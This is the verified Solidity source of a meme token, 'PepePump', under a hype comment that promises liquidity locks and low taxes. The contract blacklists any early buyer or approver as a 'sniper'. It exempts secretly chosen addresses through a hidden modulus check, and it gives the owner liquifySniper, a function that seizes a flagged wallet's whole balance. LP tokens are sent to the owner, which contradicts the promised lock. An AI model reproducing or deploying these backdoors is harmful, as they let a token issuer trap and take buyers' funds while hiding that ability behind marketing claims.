/**
 *Submitted for verification at Etherscan.io on 2022-08-03
*/

/*
After his absence was mourned by fellow degens alike, Pepe returns to give us what we deserve.
An absolute moonshot. 

2% taxes will be dropped to 1% once team has enough for calls!

1 month lock at 25k MC
3 month extension at 50k MC
6 month extension at 100k MC

Whoever opens the Community TG... you may see some familiar faces joining. 

__________████████_____██████
_________█░░░░░░░░██_██░░░░░░█
________█░░░░░░░░░░░█░░░░░░░░░█
_______█░░░░░░░███░░░█░░░░░░░░░█
_______█░░░░███░░░███░█░░░████░█
______█░░░██░░░░░░░░███░██░░░░██
_____█░░░░░░░░░░░░░░░░░█░░░░░░░░███
____█░░░░░░░░░░░░░██████░░░░░████░░█
____█░░░░░░░░░█████░░░████░░██░░██░░█
___██░░░░░░░███░░░░░░░░░░█░░░░░░░░███
__█░░░░░░░░░░░░░░█████████░░█████████
_█░░░░░░░░░░█████_████___████_█████___█
_█░░░░░░░░░░█______█_███__█_____███_█___█
█░░░░░░░░░░░░█___████_████____██_██████
░░░░░░░░░░░░░█████████░░░████████░░░█
░░░░░░░░░░░░░░░░█░░░░░█░░░░░░░░░░░░█
░░░░░░░░░░░░░░░░░░░░██░░░░█░░░░░░██
░░░░░░░░░░░░░░░░░░██░░░░░░░███████
░░░░░░░░░░░░░░░░██░░░░░░░░░░█░░░░░█
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
░░░░░░░░░░░█████████░░░░░░░░░░░░░░██
░░░░░░░░░░█▒▒▒▒▒▒▒▒███████████████▒▒█
░░░░░░░░░█▒▒███████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
░░░░░░░░░█▒▒▒▒▒▒▒▒▒█████████████████
░░░░░░░░░░████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
░░░░░░░░░░░░░░░░░░██████████████████
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
██░░░░░░░░░░░░░░░░░░░░░░░░░░░██
▓██░░░░░░░░░░░░░░░░░░░░░░░░██
▓▓▓███░░░░░░░░░░░░░░░░░░░░█
▓▓▓▓▓▓███░░░░░░░░░░░░░░░██
▓▓▓▓▓▓▓▓▓███████████████▓▓█
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
*/
//SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PepePump is IERC20, Auth {
	string _name = "PepePump";
	string _symbol = "PEPE";
	uint256 constant _totalSupply = 1000 * (10**6) * (10 ** _decimals);
	uint8 constant _decimals = 9;
	uint32 _smd; uint32 _smr;
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
	mapping (address => bool) private _noFees;
	mapping (address => bool) private _noLimits;
	bool public tradingOpen;
	uint256 public maxTxAmount; uint256 public maxWalletAmount;
	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
	mapping (address => bool) private _isLiqPool;
	uint16 public snipersCaught = 0;
	uint8 _defTaxRate = 2; 
	uint8 private _buyTaxRate; uint8 private _sellTaxRate; uint8 private _txTaxRate;
	uint16 private _tokenTaxShares = 0;
	uint16 private _burnTaxShares  = 0;
	uint16 private _autoLPShares   = 100;
	uint16 private _ethTaxShares1  = 100;
	uint16 private _ethTaxShares2  = 0;
	uint16 private _ethTaxShares3  = 0;
	uint16 private _totalTaxShares = _tokenTaxShares + _burnTaxShares + _autoLPShares + _ethTaxShares1 + _ethTaxShares2 + _ethTaxShares3;
	address constant _burnWallet = address(0);

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) private _sniperBlock;

	uint8 private _gasPriceBlocks = 10;
	uint256 blackGwei = 80 * 10**9;

	address payable private _ethTaxWallet1 = payable(0xee0B98A3de0710420D2A9Fa495e1347ccb053BFd); 
	address payable private _ethTaxWallet2 = payable(0xee0B98A3de0710420D2A9Fa495e1347ccb053BFd); 
	address payable private _ethTaxWallet3 = payable(0xee0B98A3de0710420D2A9Fa495e1347ccb053BFd); 
	address private _tokenTaxWallet = address(0x7097DB564f6a124746127Ccf7aafFaB1fE4eA511); 
	bool private _inTaxSwap = false;
	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2 for ETH
	IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	constructor () Auth(msg.sender) {      
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		_taxSwapMin = _totalSupply * 10 / 10000;
		_taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
		_noFees[owner] = true;
		_noFees[address(this)] = true;
		_noFees[_uniswapV2RouterAddress] = true;
		_noFees[_ethTaxWallet1] = true;
		_noFees[_tokenTaxWallet] = true;
		_noLimits[_ethTaxWallet1] = true;
		_noLimits[_tokenTaxWallet] = true;
		_noLimits[_burnWallet] = true;

		_smd = 1876450190; _smr = 1876450190;
		_balances[address(this)] = _totalSupply / 2;
		emit Transfer(address(0), address(this), _totalSupply/2);
		_balances[owner] = _totalSupply / 2;
		emit Transfer(address(0), address(owner), _totalSupply/2);
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external view override returns (string memory) { return _symbol; }
	function name() external view override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
			//wallets approving before CA is announced as safe are obvious snipers
			_markSniper(msg.sender, block.number);
		}

		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		if(_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!tradingOpen, "trading already open");
		require(ethAmountWei > 0, "eth cannot be 0");

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[_ethTaxWallet1] = true;
        _nonSniper[_tokenTaxWallet] = true;

		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei, "not enough eth");
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0, "no tokens");
		address _uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_isLiqPool[_uniLpAddr] = true;
		_nonSniper[_uniLpAddr] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, false);

		_openTrading();
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if ( !autoburn ) { lpTokenRecipient = owner; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function _openTrading() internal {
		_humanBlock = block.number + 10;
		maxTxAmount     = 50 * _totalSupply / 1000 + 10**_decimals; 
		maxWalletAmount = 50 * _totalSupply / 1000 + 10**_decimals;
		_buyTaxRate = _defTaxRate;
		_sellTaxRate = _defTaxRate;
		_txTaxRate = 0; 
		tradingOpen = true;
	}

	function humanize() external onlyOwner{
		_humanize(0);
	}

	function _humanize(uint8 blkcount) internal {
		if ( _humanBlock > block.number || _humanBlock == 0 ) {
			_humanBlock = block.number + blkcount;
		}
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender != address(0), "No transfers from Zero wallet");
		if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
			else if ( _sniperBlock[sender] == 0 ) { _markSniper(recipient, block.number); }
			else { _markSniper(recipient, _sniperBlock[sender]); }
		} else {
			if ( _sniperBlock[sender] != 0 ) { _markSniper(recipient, _sniperBlock[sender]); }
			if ( block.number < _humanBlock + _gasPriceBlocks && tx.gasprice > block.basefee ) {
				uint256 priceDiff = tx.gasprice - block.basefee;
		    		if ( priceDiff >= blackGwei ) { revert("Gas price over limit"); } 
		    	}
		}
		if ( tradingOpen && _sniperBlock[sender] != 0 && _sniperBlock[sender] < block.number ) {
			revert("blacklisted");
		}

		if ( !_inTaxSwap && _isLiqPool[recipient] ) {
			_swapTaxAndLiquify();
		}
		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _markSniper(address wallet, uint256 snipeBlockNum) internal {
		if ( !_nonSniper[wallet] && _sniperBlock[wallet] == 0 ) { 
			_sniperBlock[wallet] = snipeBlockNum; 
			snipersCaught ++;
		}
	}
		
	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( tradingOpen && !_noLimits[recipient] ) {
			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _checkTradingOpen() private view returns (bool){
		bool checkResult = false;
		if ( tradingOpen ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !tradingOpen || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * _buyTaxRate / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * _sellTaxRate / 100; }
		else { taxAmount = amount * _txTaxRate / 100; }
		return taxAmount;
	}

	function isSniper(address wallet) external view returns(bool) {
		if ( _sniperBlock[wallet] != 0 ) { return true; }
		else { return false; }
	}

	function sniperCaughtInBlock(address wallet) external view returns(uint256) {
		return _sniperBlock[wallet];
	}

	function ignoreFees(address wallet, bool toggle) external onlyOwner {
		_noFees[ wallet ] = toggle;
	}

	function ignoreLimits(address wallet, bool toggle) external onlyOwner {
		if ( wallet == _burnWallet ) { require(toggle, "Zero wallet must be unlimited"); }
		_noLimits[ wallet ] = toggle;
	}

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
		require(newBuyTax <= _defTaxRate && newSellTax <= _defTaxRate && newTxTax <= _defTaxRate, "Tax too high");
		_buyTaxRate = newBuyTax;
		_sellTaxRate = newSellTax;
		_txTaxRate = newTxTax;
	}

	function enableBuySupport() external onlyOwner {
		_buyTaxRate = 0;
		_sellTaxRate = 2 * _defTaxRate;
	}
  
	function setTaxDistribution(uint16 sharesTokenWallet, uint16 sharesBurnedTokens, uint16 sharesAutoLP, uint16 sharesEthWallet1, uint16 sharesEthWallet2, uint16 sharesEthWallet3) external onlyOwner {
		_tokenTaxShares = sharesTokenWallet;
		_burnTaxShares  = sharesBurnedTokens;
		_autoLPShares = sharesAutoLP;
		_ethTaxShares1 = sharesEthWallet1;
		_ethTaxShares2 = sharesEthWallet2;
		_ethTaxShares3 = sharesEthWallet3;
		_totalTaxShares = sharesTokenWallet + sharesBurnedTokens + sharesAutoLP + sharesEthWallet1 + sharesEthWallet2 + sharesEthWallet3;
	}

	function setTaxWallets(address newEthWallet1, address newEthWallet2, address newEthWallet3, address newTokenTaxWallet) external onlyOwner {
		_ethTaxWallet1 = payable(newEthWallet1);
		_ethTaxWallet2 = payable(newEthWallet2);
		_ethTaxWallet3 = payable(newEthWallet3);
		_tokenTaxWallet = newTokenTaxWallet;
		_noFees[newEthWallet1] = true;
		_noFees[newEthWallet2] = true;
		_noFees[newEthWallet3] = true;
		_noFees[_tokenTaxWallet] = true;
		_noLimits[_tokenTaxWallet] = true;
	}

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= maxTxAmount, "tx limit too low");
		maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
		maxWalletAmount = newWalletAmt;
	}

	function liquifySniper(address wallet) external onlyOwner lockTaxSwap {
		require(_sniperBlock[wallet] != 0, "not a sniper");
		uint256 sniperBalance = balanceOf(wallet);
		require(sniperBalance > 0, "no tokens");
		//if a wallet was caught and marked as a sniper this can convert their tokens into uniswap liquidity

		_balances[wallet] = _balances[wallet] - sniperBalance;
		_balances[address(this)] = _balances[address(this)] + sniperBalance;
		emit Transfer(wallet, address(this), sniperBalance);

		uint256 liquifiedTokens = sniperBalance/2 - 1;
		uint256 _ethPreSwap = address(this).balance;
		_swapTaxTokensForEth(liquifiedTokens);
		uint256 _ethSwapped = address(this).balance - _ethPreSwap;
		_approveRouter(liquifiedTokens);
		_addLiquidity(liquifiedTokens, _ethSwapped, false);
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		_taxSwapMin = _totalSupply * minValue / minDivider;
		_taxSwapMax = _totalSupply * maxValue / maxDivider;
	}


	function _transferTaxTokens(address recipient, uint256 amount) private {
		if ( amount > 0 ) {
			_balances[address(this)] = _balances[address(this)] - amount;
			_balances[recipient] = _balances[recipient] + amount;
			emit Transfer(address(this), recipient, amount);
		}
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= _taxSwapMin && tradingOpen ) {
			if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

			
			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / _totalTaxShares / 2;
			uint256 _tokensToTransfer = _taxTokensAvailable * _tokenTaxShares / _totalTaxShares;
			_transferTaxTokens(_tokenTaxWallet, _tokensToTransfer);
			uint256 _tokensToBurn = _taxTokensAvailable * _burnTaxShares / _totalTaxShares;
			_transferTaxTokens(_burnWallet, _tokensToBurn);
			
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP - _tokensToTransfer - _tokensToBurn;
			uint256 _ethPreSwap = address(this).balance;
			_swapTaxTokensForEth(_tokensToSwap);
			uint256 _ethSwapped = address(this).balance - _ethPreSwap;
			if ( _autoLPShares > 0 ) {
				uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / _totalTaxShares ;
				_approveRouter(_tokensForLP);
				_addLiquidity(_tokensForLP, _ethWeiAmount, false);
			}
			uint256 _contractETHBalance = address(this).balance;
			if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswapV2Router.WETH();
		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _taxShareTotal = _ethTaxShares1 + _ethTaxShares2 + _ethTaxShares3;
		if ( _ethTaxShares1 > 0 ) { _ethTaxWallet1.transfer(_amount * _ethTaxShares1 / _taxShareTotal); }
		if ( _ethTaxShares2 > 0 ) { _ethTaxWallet2.transfer(_amount * _ethTaxShares2 / _taxShareTotal); }
		if ( _ethTaxShares3 > 0 ) { _ethTaxWallet3.transfer(_amount * _ethTaxShares3 / _taxShareTotal); }
	}

	function taxTokensSwap() external onlyOwner {
		uint256 taxTokenBalance = balanceOf(address(this));
		require(taxTokenBalance > 0, "No tokens");
		_swapTaxTokensForEth(taxTokenBalance);
	}

	function taxEthSend() external onlyOwner { 
		_distributeTaxEth(address(this).balance); 
	}
}